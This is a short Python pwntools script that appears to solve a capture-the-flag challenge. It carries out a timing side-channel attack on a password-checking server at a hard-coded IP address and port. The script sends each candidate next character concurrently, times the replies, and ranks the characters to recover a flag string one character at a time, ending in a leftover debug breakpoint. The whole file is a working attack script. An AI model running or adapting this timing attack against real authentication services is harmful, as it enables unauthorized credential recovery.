import time
import asyncio
from pwn import *
import logging

log.setLevel(logging.WARN)
# Configuration
SERVER_IP = '184.72.87.9'
SERVER_PORT = 8006
CHARSET = string.ascii_letters + string.digits + '_}'
PASSWORD_PREFIX = 'flag{i_wouldve_used_argon2_but_i_didnt_want_to_kill_our_infra}'
THRESHOLD = 30

def req_password(guess):
    with context.local(log_level='error'):
        r = remote(SERVER_IP, SERVER_PORT)
        r.recvline()
        r.sendline(guess)
        ret = r.recvline()
        if ret == "Hey you got it! nice work!\n":
            print(guess)
            import sys
            sys.exit(0)
        r.close()

async def attempt_password(char):
    started = time.time()
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, req_password, PASSWORD_PREFIX + char)
    ended = time.time()
    print(char, (ended - started))
    return [char, (ended - started)]

async def find_password():
    tasks = []
    for char in CHARSET:
        tasks.append(asyncio.create_task(attempt_password(char)))
    done, pending = await asyncio.wait(tasks, timeout=THRESHOLD)
    results = [task.result() for task in done]
    results = list(sorted(results, key=lambda x: x[1]))
    test = [ord(i) + j for i, j in results]
    test2 = [ord(i) - j for i, j in results]
    pprint(results)
    breakpoint()

if __name__ == "__main__":
    asyncio.run(find_password())